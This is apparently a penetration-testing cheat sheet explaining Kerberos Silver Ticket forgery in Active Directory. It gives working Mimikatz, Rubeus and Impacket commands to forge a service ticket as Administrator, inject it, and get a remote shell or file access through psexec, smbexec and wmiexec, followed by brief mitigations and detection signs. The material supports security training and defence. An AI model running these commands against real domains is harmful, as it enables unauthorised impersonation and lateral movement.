### Content

- [Overview](#overview)
	- [Extracting Domain SID](#extracting-domain-sid)
- [From Windows](#from-windows)
- [From Linux](#from-linux)

---
### Overview

> A service can be hosted in a machine account or a user account.

A user want to use a service:

- He will send his TGT + the requested SPN to the DC.
- The DC will find out which account is hosting the requested SPN.
- The DC will copy the user information from the PAC inside the TGT and will add it to the TGS PAC which will then be encrypted using the service account secret. 

If an attacker compromised the service account and extracted its secretes. he will be able to forge STs and add whatever information he wants in the PAC, such as being domain administrator.

The service can decrypt it because it has been encrypted with its own password, and then it will read the contents of the PAC.

This forged ticket is called a `Silver Ticket`.

Service to Silver Ticket Reference:

| Service Type                               | Service Silver Tickets                                                             |
| ------------------------------------------ | ---------------------------------------------------------------------------------- |
| WMI                                        | HOST  <br>RPCSS                                                                    |
| PowerShell Remoting                        | HOST  <br>HTTP<br><br>Depending on OS version may also need:  <br>WSMAN  <br>RPCSS |
| WinRM                                      | HOST  <br>HTTP                                                                     |
| Scheduled Tasks                            | HOST                                                                               |
| Windows File Share (CIFS)                  | CIFS                                                                               |
| LDAP operations including Mimikatz DCSync  | LDAP                                                                               |
| Windows Remote Server Administration Tools | RPCSS  <br>LDAP  <br>CIFS                                                          |

Elements needed to forge a silver ticket:

- Domain Name
- Domain SID
- Username to Impersonate
- Compromised service's hash

###### Extracting Domain SID

From Windows

```PowerShell
# Activedriectory module
(Get-ADDomain).DomainSID.Value

# Using PowerView
Get-DomainSID
```

From Linux

```
# Using ldap module from NXC
nxc ldap <DC-IP> -u <user> -p <pass> --get-sid

lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
```

---
### From Windows

Generate and pass the ticket in the current session using Mimikatz

```PowerShell
# We compromised a server sql01$ and we want to access its file system (CIFS)

# Using mimikatz (you may use: /rc4 - /aes128 - /aes256)
kerberos::golden /domain:corp.local /user:Administrator /sid:<domainSID> /rc4:<serviceAccountHash> /target:sql01.corp.local /service:cifs /ptt
```

OR Abuse a sacrificial process created by rubeus

```PowerShell
# Create a TGS and save it to a file
kerberos::golden /domain:corp.local /user:Administrator /sid:<domainSID> /rc4:<serviceAccountHash> /target:sql01.corp.local /service:cifs /ticket:sql01.kirbi

# Create the sacrifical process
Rubeus.exe createnetonly /program:cmd.exe /show

# Inject the TGS into the sacrificial process
Rubeus.exe ptt /ticket:sql01.kirbi
```

Using the injected `CIFS` TGS on the target host

```powershell
dir //sql01.corp.local/c$
# Or
PSExec.exe -accepteula \\sql01.corp.local cmd
```

---
### From Linux

Using `ticketer.py` from Impacket 

```bash
ticketer.py -nthash <serviceHash> -domain-sid <sid> -domain corp.local -spn cifs/sql01.corp.local Administrator

# Import the generated teicket and use to access CIFS
export KRB5CCNAME=./Administrator.ccache
smbclient.py -k -no-pass sql01.corp.local
psexec.py -k -no-pass sql01.corp.local
smbexec.py -k -no-pass sql01.corp.local
wmiexec.py -k -no-pass sql01.corp.local
```

---
### Mitigation

- Ensure service accounts have strong passwords with a complexity of 25 or more characters
- Utilize MSA, gMSA or dMSA and ensure passwords rotate regularly.
- Do not place service accounts within privileged groups like domain administrators
- Limit the permissions service accounts have to only what is required for them to function

Silver Tickets forged with Mimikatz can be detected in a few ways.

- The account DOMAIN field is blank.
- The account DOMAIN field contains DOMAIN FQDN instead of just domain.